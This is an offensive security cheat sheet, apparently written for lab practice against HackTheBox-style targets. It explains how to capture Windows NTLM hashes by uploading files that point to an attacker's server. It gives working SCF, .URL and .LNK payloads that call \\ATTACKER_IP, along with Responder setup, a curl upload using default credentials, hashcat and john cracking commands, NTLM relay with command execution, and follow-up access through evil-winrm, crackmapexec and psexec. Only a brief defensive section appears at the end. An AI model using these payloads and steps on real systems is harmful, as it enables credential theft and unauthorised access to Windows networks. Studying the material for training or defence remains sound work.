# Windows Hash Capture & NTLM Attacks

Techniques for capturing NTLM hashes in Windows environments without initial credentials.

---

## Overview

When you have a foothold that allows file uploads to a Windows server but lack credentials for SMB/WinRM, these techniques force NTLM authentication to your attacker machine, capturing hashes that can be cracked or relayed.

**Prerequisites:**
- File upload capability to Windows target
- Attacker machine accessible via SMB (port 445) from target
- Responder or similar tool for hash capture

---

## SCF File Attack

### What is SCF?

SCF (Shell Command File) is a Windows shortcut format parsed by Explorer when displaying folder contents. The `IconFile` directive can point to a UNC path, triggering NTLM authentication when Windows tries to load the icon.

### Attack Mechanics

```
Upload SCF → Stored in share → Admin browses folder → 
Explorer parses SCF → IconFile triggers SMB auth → 
Responder captures NTLM hash → Crack → Use creds
```

### SCF Payload

```scf
[Shell]
Command=2
IconFile=\\ATTACKER_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

**Key fields:**
- `IconFile` — UNC path to attacker SMB server (triggers auth)
- `Command` — Required field (value 2 = minimize)

### Execution Steps

**1. Create SCF file:**
```bash
cat << 'EOF' > exploit.scf
[Shell]
Command=2
IconFile=\\10.10.14.X\smb\legit.ico
[Taskbar]
Command=ToggleDesktop
EOF
```

**2. Start Responder:**
```bash
sudo responder -I tun0 -v
```

**3. Upload via web portal:**
```bash
curl -u admin:admin \
  -F "file=@exploit.scf" \
  -F "submit=Upload" \
  "http://target/fw_up.php"
```

**4. Capture hash:**
Responder logs to `/usr/share/responder/logs/`

**5. Crack the hash:**
```bash
# Mode 5600 = NetNTLMv2
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Or John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Indicators This Attack Applies

| Clue | Significance |
|------|--------------|
| "Manual review" of uploads | Someone will browse the folder |
| SMB requires auth | You need creds; SCF provides them |
| Port 445 reachable | Windows can auth to you |
| Accepts arbitrary extensions | SCF won't be filtered |
| Printer/Windows theme | NTLM is standard auth |
| WinRM/SMB open | Confirms creds = access |

---

## .URL File Attack

Similar to SCF, Windows URL shortcuts can trigger NTLM.

### Payload

```ini
[InternetShortcut]
URL=http://target
IconFile=\\ATTACKER_IP\share\icon.ico
IconIndex=1
```

**Advantage:** Less suspicious than SCF (looks like a web shortcut)

---

## .LNK File Attack

Windows shortcut files can also embed UNC paths for icons.

### Creation (PowerShell)

```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("exploit.lnk")
$lnk.IconLocation = "\\ATTACKER_IP\share\icon.ico"
$lnk.Save()
```

**Note:** .LNK files are binary; harder to create manually than SCF.

---

## Responder Configuration

### Basic Usage

```bash
# All protocols
sudo responder -I eth0 -v

# SMB only
sudo responder -I eth0 --lm

# Specific interface (HTB VPN)
sudo responder -I tun0 -v
```

### Firewall Requirements

```bash
# Allow SMB from target network
sudo ufw allow from 10.0.0.0/8 to any port 445
sudo ufw allow from 10.0.0.0/8 to any port 139
```

### Hash Output Location

```
/usr/share/responder/logs/
├── SMBv2-NTLMv2-SSP-10.129.x.x.txt
├── HTTP-NTLMv2-10.129.x.x.txt
└── Responder-Session.log
```

---

## Post-Capture Actions

### Crack Hash

```bash
# Hashcat (NetNTLMv2 = mode 5600)
hashcat -m 5600 hash.txt rockyou.txt

# John
john --wordlist=rockyou.txt hash.txt
```

### Use Credentials

```bash
# WinRM
evil-winrm -i target.htb -u admin -p 'cracked_pass'

# SMB
crackmapexec smb target.htb -u admin -p 'cracked_pass' --shares
smbclient //target.htb/share -U admin

# PSExec (if admin)
impacket-psexec admin:'cracked_pass'@target.htb
```

---

## Variations & Advanced

### Forcing Authentication via Other Means

| Method | Trigger |
|--------|---------|
| Document properties | Word/Excel embedded UNC |
| Desktop.ini | Folder icon UNC path |
| Library files | Windows 7+ library icons |
| Theme files | .theme with UNC sounds/icons |

### NTLM Relay (instead of cracking)

If you can't crack the hash, relay it:

```bash
# Impacket ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# With command execution
ntlmrelayx.py -t smb://target.htb -c "whoami"
```

**Note:** Relay only works if SMB signing is disabled on target.

---

## Defensive Indicators

- Unusual SCF/URL/LNK files in uploads
- Outbound SMB connections to unknown IPs
- Responder detection (poisoning attempts)

---

## References

- Responder: https://github.com/lgandx/Responder
- SCF attacks: https://pentestlab.blog/2017/12/13/shell-command-file-scf/
- NTLM relay: https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying.html
